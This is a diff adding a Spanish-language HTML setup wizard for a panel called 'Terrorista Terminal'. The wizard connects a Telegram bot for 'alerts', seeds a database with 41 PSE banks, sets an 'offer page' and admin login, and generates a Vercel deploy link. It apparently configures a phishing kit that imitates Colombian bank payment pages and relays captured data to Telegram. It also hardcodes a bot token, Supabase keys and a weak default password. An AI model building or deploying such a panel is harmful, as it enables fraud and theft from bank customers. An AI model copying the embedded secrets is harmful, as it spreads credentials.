@@ -1,0 +1,699 @@
+<!DOCTYPE html>
+<html lang="es" class="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instalador Rápido - Terrorista Terminal</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #0c0a09;
+      --card-bg: #1c1917;
+      --card-border: #292524;
+      --accent: #8b5cf6;
+      --accent-hover: #7c3aed;
+      --accent-glow: rgba(139, 92, 246, 0.25);
+      --btn-text: #fff;
+      --card-radius: 1.75rem;
+      --text: #f4f4f5;
+      --text-muted: #a1a1aa;
+      --danger: #ef4444;
+      --warning: #f59e0b;
+      --info: #3b82f6;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+      background-color: var(--bg);
+      color: var(--text);
+      line-height: 1.5;
+      padding: 2.5rem 1rem;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 680px;
+      margin: 0 auto;
+    }
+
+    .card {
+      background: var(--card-bg);
+      border: 1px solid var(--card-border);
+      border-radius: var(--card-radius);
+      padding: 2.5rem 2rem;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+      position: relative;
+      overflow: hidden;
+    }
+
+    .card::before {
+      content: '';
+      position: absolute;
+      top: -100px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 300px;
+      height: 200px;
+      background: radial-gradient(circle, var(--accent-glow) 0%, transparent 70%);
+      filter: blur(50px);
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      padding: 0.35rem 0.85rem;
+      border-radius: 9999px;
+      font-size: 0.8rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      background: var(--accent-glow);
+      color: var(--accent);
+      border: 1px solid var(--accent);
+      margin-bottom: 1rem;
+      position: relative;
+      z-index: 1;
+    }
+
+    h1 {
+      font-size: 2rem;
+      font-weight: 800;
+      letter-spacing: -0.03em;
+      color: #fff;
+      margin-bottom: 0.5rem;
+      position: relative;
+      z-index: 1;
+    }
+
+    p.subtitle {
+      color: var(--text-muted);
+      font-size: 0.95rem;
+      margin-bottom: 2rem;
+      position: relative;
+      z-index: 1;
+    }
+
+    .form-section {
+      display: flex;
+      flex-direction: column;
+      gap: 1.25rem;
+      position: relative;
+      z-index: 1;
+    }
+
+    .form-group {
+      display: flex;
+      flex-direction: column;
+      gap: 0.4rem;
+    }
+
+    label {
+      font-size: 0.85rem;
+      font-weight: 700;
+      color: #e4e4e7;
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+    }
+
+    .label-hint {
+      font-size: 0.75rem;
+      color: var(--text-muted);
+      font-weight: 400;
+    }
+
+    input {
+      width: 100%;
+      background: #09090b;
+      border: 1px solid var(--card-border);
+      border-radius: 0.75rem;
+      padding: 0.85rem 1.1rem;
+      color: #fff;
+      font-size: 0.95rem;
+      font-family: inherit;
+      outline: none;
+      transition: all 0.2s ease;
+    }
+
+    input:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px var(--accent-glow);
+      background: #0d0d10;
+    }
+
+    .grid-2 {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1rem;
+    }
+
+    .divider {
+      height: 1px;
+      background: var(--card-border);
+      margin: 0.5rem 0;
+    }
+
+    .section-title {
+      font-size: 0.95rem;
+      font-weight: 700;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .btn-submit {
+      width: 100%;
+      background: linear-gradient(135deg, var(--accent) 0%, var(--accent-hover) 100%); color: var(--btn-text, #000); box-shadow: 0 4px 20px var(--accent-glow); font-weight: 800; font-size: 1.05rem; padding: 1rem 1.5rem; border-radius: 0.75rem; border: none; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; transition: all 0.2s ease;
+      margin-top: 0.5rem;
+    }
+
+    .btn-submit:hover {
+      background: var(--accent-hover);
+      box-shadow: 0 0 30px rgba(16, 185, 129, 0.35);
+      transform: translateY(-1px);
+    }
+
+    .btn-submit:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    /* Progress Overlay / Steps View */
+    .progress-box {
+      display: none;
+      flex-direction: column;
+      gap: 0.85rem;
+      background: #09090b;
+      border: 1px solid var(--card-border);
+      border-radius: 1rem;
+      padding: 1.5rem;
+      margin-top: 1.5rem;
+    }
+
+    .progress-step {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      font-size: 0.9rem;
+      color: var(--text-muted);
+    }
+
+    .progress-step.done {
+      color: var(--accent);
+      font-weight: 600;
+    }
+
+    .progress-step.active {
+      color: #fff;
+      font-weight: 700;
+    }
+
+    .spinner {
+      width: 18px;
+      height: 18px;
+      border: 2px solid var(--accent-glow);
+      border-top-color: var(--accent);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* Results Screen */
+    .results-screen {
+      display: none;
+      flex-direction: column;
+      gap: 1.5rem;
+      animation: fadeIn 0.4s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .result-card {
+      background: #09090b;
+      border: 1px solid var(--card-border);
+      border-radius: 1rem;
+      padding: 1.25rem;
+      display: flex;
+      flex-direction: column;
+      gap: 0.75rem;
+    }
+
+    .result-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 0.9rem;
+      padding-bottom: 0.5rem;
+      border-bottom: 1px solid #18181b;
+    }
+
+    .result-row:last-child {
+      border-bottom: none;
+      padding-bottom: 0;
+    }
+
+    .result-label {
+      color: var(--text-muted);
+      font-weight: 500;
+    }
+
+    .result-value {
+      color: #fff;
+      font-weight: 700;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.85rem;
+    }
+
+    .btn-vercel {
+      width: 100%;
+      background: #ffffff;
+      color: #000000;
+      font-weight: 800;
+      font-size: 1rem;
+      padding: 0.9rem 1.5rem;
+      border-radius: 0.75rem;
+      border: none;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.6rem;
+      text-decoration: none;
+      transition: all 0.2s ease;
+    }
+
+    .btn-vercel:hover {
+      background: #e4e4e7;
+      transform: translateY(-1px);
+    }
+
+    .btn-secondary {
+      width: 100%;
+      background: #27272a;
+      color: #f4f4f5;
+      font-weight: 700;
+      font-size: 0.9rem;
+      padding: 0.85rem 1.5rem;
+      border-radius: 0.75rem;
+      border: 1px solid #3f3f46;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      text-decoration: none;
+      transition: all 0.2s ease;
+    }
+
+    .btn-secondary:hover {
+      background: #3f3f46;
+    }
+
+    @media (max-width: 600px) {
+      .grid-2 { grid-template-columns: 1fr; }
+      .card { padding: 1.75rem 1.25rem; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="card">
+      
+      <!-- Pantalla de Configuración -->
+      <div id="setupScreen">
+        <div class="badge">🪄 Instalación en 1 Clic</div>
+        <h1>Configura tu Panel</h1>
+        <p class="subtitle">Solo completa estos datos. El sistema configurará la base de datos, conectará el bot y dejará todo listo.</p>
+
+        <form id="installForm" class="form-section" onsubmit="handleInstall(event)">
+          
+          <div class="section-title">🤖 Bot de Telegram</div>
+
+          <div class="form-group">
+            <label>Bot Token <span class="label-hint">(Obtenido de @BotFather)</span></label>
+            <input 
+              type="text" 
+              id="botToken" 
+              required 
+              value="7452547983:AAE5WjJOBqOSqq6zWSY30VspM1f4UUuSypA"
+              placeholder="Ej: 7452547983:AAE5WjJOBqOSqq6zWSY30VspM1f4UUuSypA"
+            >
+          </div>
+
+          <div class="form-group">
+            <label>Chat ID <span class="label-hint">(ID del chat o grupo donde llegarán las alertas)</span></label>
+            <input 
+              type="text" 
+              id="chatId" 
+              required 
+              value="-1003775321635"
+              placeholder="Ej: -1003775321635"
+            >
+          </div>
+
+          <!-- Opción Opcional: Canal de Logs -->
+          <div style="background: #09090b; padding: 1rem; border-radius: 0.75rem; border: 1px solid var(--card-border); margin-top: 0.25rem;">
+            <label style="cursor: pointer; display: flex; align-items: center; justify-content: space-between;">
+              <span style="display: flex; items-center; gap: 0.4rem;">
+                <span>🔔</span>
+                <span>Activar canal de logs y auditoría</span>
+                <span class="label-hint">(Opcional)</span>
+              </span>
+              <input type="checkbox" id="toggleLogs" onchange="document.getElementById('logsField').style.display = this.checked ? 'block' : 'none';" style="width: 18px; height: 18px; cursor: pointer; accent-color: var(--accent);">
+            </label>
+            <div id="logsField" style="display: none; margin-top: 0.75rem;">
+              <input 
+                type="text" 
+                id="chatLogs" 
+                placeholder="ID de canal exclusivo para logs (ej. -1009876543210)"
+              >
+            </div>
+          </div>
+
+          <div class="divider"></div>
+
+          <div class="section-title">⚙️ Parámetros del Proyecto</div>
+
+          <div class="grid-2">
+            <div class="form-group">
+              <label>Nombre del Proyecto (PROYECTO)</label>
+              <input 
+                type="text" 
+                id="projectName" 
+                required 
+                value="TERRORISTA"
+                placeholder="Ej: TERRORISTA"
+              >
+            </div>
+            <div class="form-group">
+              <label>Página de Oferta (OFFER_PAGE)</label>
+              <input 
+                type="text" 
+                id="offerPage" 
+                required 
+                value="/"
+                placeholder="/"
+              >
+            </div>
+          </div>
+
+          <div class="divider"></div>
+
+          <div class="section-title">🛡️ Administrador para el Panel (/terrorista-admin)</div>
+
+          <div class="grid-2">
+            <div class="form-group">
+              <label>Usuario Admin (XDM_USER)</label>
+              <input 
+                type="text" 
+                id="adminUser" 
+                required 
+                value="admin"
+                placeholder="admin"
+              >
+            </div>
+            <div class="form-group">
+              <label>Contraseña Admin (XDM_PASSWORD)</label>
+              <input 
+                type="text" 
+                id="adminPass" 
+                required 
+                value="admin123*"
+                placeholder="Contraseña segura"
+              >
+            </div>
+          </div>
+
+          <button type="submit" id="btnSubmit" class="btn-submit">
+            <span>⚡ Configurar e Instalar Todo Automáticamente</span>
+          </button>
+        </form>
+
+        <!-- Progreso Automático -->
+        <div id="progressBox" class="progress-box">
+          <div class="progress-step" id="pstep-1">
+            <span class="icon">⏳</span>
+            <span>1. Probando conexión con el Bot de Telegram...</span>
+          </div>
+          <div class="progress-step" id="pstep-2">
+            <span class="icon">⏳</span>
+            <span>2. Inicializando base de datos segura y 41 bancos autorizados...</span>
+          </div>
+          <div class="progress-step" id="pstep-3">
+            <span class="icon">⏳</span>
+            <span>3. Creando credenciales de Terrorista Terminal...</span>
+          </div>
+          <div class="progress-step" id="pstep-4">
+            <span class="icon">⏳</span>
+            <span>4. Generando enlace de despliegue a Vercel con 1 Clic...</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Pantalla Final de Éxito -->
+      <div id="resultsScreen" class="results-screen">
+        <div style="text-align: center;">
+          <div style="font-size: 3.5rem; margin-bottom: 0.5rem;">🎉</div>
+          <h2 style="font-size: 1.75rem; font-weight: 800; color: #fff;">¡Instalación Completada con Éxito!</h2>
+          <p style="color: var(--text-muted); font-size: 0.9rem; margin-top: 0.25rem;">
+            Tu bot de Telegram está conectado y tu base de datos multi-tenant está 100% lista.
+          </p>
+        </div>
+
+        <div class="result-card">
+          <div class="result-row">
+            <span class="result-label">🤖 Bot Telegram:</span>
+            <span class="result-value" id="resBotName">@tiquetsbot</span>
+          </div>
+          <div class="result-row">
+            <span class="result-label">💬 Chat ID Alertas:</span>
+            <span class="result-value" id="resChatId">-1003775321635</span>
+          </div>
+          <div class="result-row">
+            <span class="result-label">👤 Usuario Admin:</span>
+            <span class="result-value" id="resUser">admin</span>
+          </div>
+          <div class="result-row">
+            <span class="result-label">🔒 Contraseña Admin:</span>
+            <span class="result-value" id="resPass">admin123*</span>
+          </div>
+          <div class="result-row">
+            <span class="result-label">🏦 Bancos PSE:</span>
+            <span class="result-value" style="color: var(--accent);">41 Bancos Activos</span>
+          </div>
+        </div>
+
+        <div style="display: flex; flex-direction: column; gap: 0.75rem; margin-top: 0.5rem;">
+          <a id="btnDeployVercel" href="#" target="_blank" class="btn-vercel">
+            <span>▲</span>
+            <span>Publicar en Vercel con 1 Clic (Gratis)</span>
+          </a>
+
+          <button type="button" class="btn-secondary" onclick="downloadCleanEnv()">
+            <span>💾 Descargar .env.production de Respaldo</span>
+          </button>
+
+          <a href="/terrorista-admin" target="_blank" class="btn-secondary">
+            <span>🛡️ Abrir Terrorista Terminal (/terrorista-admin)</span>
+          </a>
+
+          <a href="/" target="_blank" class="btn-secondary" style="background: transparent; border-color: var(--card-border);">
+            <span>🌐 Ver Sitio Web Local</span>
+          </a>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+    const SUPABASE_DEFAULT_URL = "https://pjerxctvpxjydutbffxp.supabase.co";
+    const SUPABASE_DEFAULT_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBqZXJ4Y3R2cHhqeWR1dGJmZnhwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODQzNjg0NjEsImV4cCI6MjA5OTk0NDQ2MX0.n7Cfk-x5Ouhml1SoP3VRR9kE7xT42HaRLno8Asd-a9M";
+    const QR_SUPABASE_DEFAULT_URL = "https://cvrsrnrpykoozcviwzef.supabase.co";
+    const QR_SUPABASE_DEFAULT_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImN2cnNybnJweWtvb3pjdml3emVmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODc3MTE4NzMsImV4cCI6MjEwMzI4Nzg3M30.fnECtfKe6KDc08LitL4nHjgC6nNOnUp7-z7HycfT85I";
+
+    async function handleInstall(e) {
+      e.preventDefault();
+
+      const botToken = document.getElementById('botToken').value.trim();
+      const chatId = document.getElementById('chatId').value.trim();
+      const chatLogs = document.getElementById('chatLogs')?.value.trim() || '';
+      const projectName = document.getElementById('projectName').value.trim() || 'PYP';
+      const offerPage = document.getElementById('offerPage').value.trim() || '/';
+      const adminUser = document.getElementById('adminUser').value.trim();
+      const adminPass = document.getElementById('adminPass').value.trim();
+
+      if (!botToken || !chatId || !adminUser || !adminPass) {
+        alert('Por favor completa todos los campos requeridos.');
+        return;
+      }
+
+      // Derivar TELEGRAM_DTA del token (la parte después del :) o usar hash seguro
+      const telegramDta = botToken.includes(':') ? botToken.split(':')[1] : botToken;
+
+      document.getElementById('btnSubmit').disabled = true;
+      document.getElementById('progressBox').style.display = 'flex';
+
+      try {
+        // Paso 1: Probar Telegram
+        setStepStatus('pstep-1', 'active');
+        const tgRes = await fetch('/api/wizard', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ action: 'test_telegram', botToken, chatId })
+        });
+        const tgData = await tgRes.json();
+        if (!tgData.success) {
+          throw new Error('Telegram: ' + tgData.error);
+        }
+        setStepStatus('pstep-1', 'done', `1. Bot @${tgData.botUsername} conectado correctamente`);
+
+        // Paso 2: Inicializar Base de Datos Segura
+        setStepStatus('pstep-2', 'active');
+        const sbRes = await fetch('/api/wizard', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            action: 'init_supabase',
+            supabaseUrl: SUPABASE_DEFAULT_URL,
+            supabaseAnonKey: SUPABASE_DEFAULT_KEY,
+            telegramDta,
+            adminUser,
+            adminPassword: adminPass,
+            projectName,
+            botToken,
+            chatId
+          })
+        });
+        const sbData = await sbRes.json();
+        if (!sbData.success) {
+          throw new Error('Base de datos: ' + sbData.error);
+        }
+        setStepStatus('pstep-2', 'done', `2. Base de datos inicializada (${sbData.banksConfigured} bancos)`);
+
+        // Paso 3: Guardar .env en disco y notificar a Telegram
+        setStepStatus('pstep-3', 'active');
+        const envRes = await fetch('/api/wizard', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            action: 'save_env_config',
+            botToken,
+            chatId,
+            chatLogs,
+            telegramDta,
+            projectName,
+            offerPage,
+            adminUser,
+            adminPassword: adminPass,
+            currentOrigin: window.location.origin
+          })
+        });
+        const envData = await envRes.json();
+        if (!envData.success) {
+          console.warn('Advertencia guardando .env local:', envData.error);
+        }
+        setStepStatus('pstep-3', 'done', `3. Configuración y credenciales guardadas en .env`);
+
+        // Paso 4: Generar Enlace Vercel 1-Clic
+        setStepStatus('pstep-4', 'active');
+        const params = new URLSearchParams({
+          'env': 'TELEGRAM_BOT,TELEGRAM_CHAT,TELEGRAM_CHAT_LOGS,TELEGRAM_DTA,PROYECTO,OFFER_PAGE,XDM_USER,XDM_PASSWORD',
+          'envDescription': 'Configuración de Telegram y Credenciales del Operador',
+          'project-name': projectName.toLowerCase().replace(/[^a-z0-9-]/g, '-'),
+          'framework': 'nextjs'
+        });
+
+        document.getElementById('btnDeployVercel').href = `https://vercel.com/new/clone?${params.toString()}`;
+        setStepStatus('pstep-4', 'done', '4. Enlace de despliegue a Vercel listo');
+
+        // Mostrar pantalla de éxito
+        await new Promise(r => setTimeout(r, 700));
+        document.getElementById('setupScreen').style.display = 'none';
+        document.getElementById('resultsScreen').style.display = 'flex';
+
+        document.getElementById('resBotName').innerText = `@${tgData.botUsername}`;
+        document.getElementById('resChatId').innerText = chatId;
+        document.getElementById('resUser').innerText = adminUser;
+        document.getElementById('resPass').innerText = adminPass;
+
+      } catch (err) {
+        alert('❌ ' + err.message);
+        document.getElementById('btnSubmit').disabled = false;
+      }
+    }
+
+    function downloadCleanEnv() {
+      const botToken = document.getElementById('botToken').value.trim();
+      const chatId = document.getElementById('chatId').value.trim();
+      const chatLogs = document.getElementById('chatLogs')?.value.trim() || '';
+      const projectName = document.getElementById('projectName').value.trim() || 'PYP';
+      const offerPage = document.getElementById('offerPage').value.trim() || '/';
+      const adminUser = document.getElementById('adminUser').value.trim();
+      const adminPass = document.getElementById('adminPass').value.trim();
+      const telegramDta = botToken.includes(':') ? botToken.split(':')[1] : botToken;
+
+      const content = `# ==========================================
+# CONFIGURACION DE LA PASARELA
+# ==========================================
+TELEGRAM_BOT=${botToken}
+TELEGRAM_CHAT=${chatId}
+TELEGRAM_CHAT_LOGS=${chatLogs}
+TELEGRAM_DTA=${telegramDta}
+PROYECTO=${projectName}
+OFFER_PAGE=${offerPage}
+
+# Credenciales de Administrador para /terrorista-admin
+XDM_USER=${adminUser}
+XDM_PASSWORD=${adminPass}
+`;
+
+      const blob = new Blob([content], { type: 'text/plain' });
+      const a = document.createElement('a');
+      a.href = URL.createObjectURL(blob);
+      a.download = '.env.production';
+      a.click();
+    }
+
+    function setStepStatus(stepId, status, customText = '') {
+      const el = document.getElementById(stepId);
+      if (!el) return;
+
+      if (status === 'active') {
+        el.className = 'progress-step active';
+        el.querySelector('.icon').innerHTML = '<div class="spinner"></div>';
+      } else if (status === 'done') {
+        el.className = 'progress-step done';
+        el.querySelector('.icon').innerHTML = '✓';
+        if (customText) {
+          el.querySelector('span:last-child').innerText = customText;
+        }
+      }
+    }
+  </script>
+
+</body>
+</html>
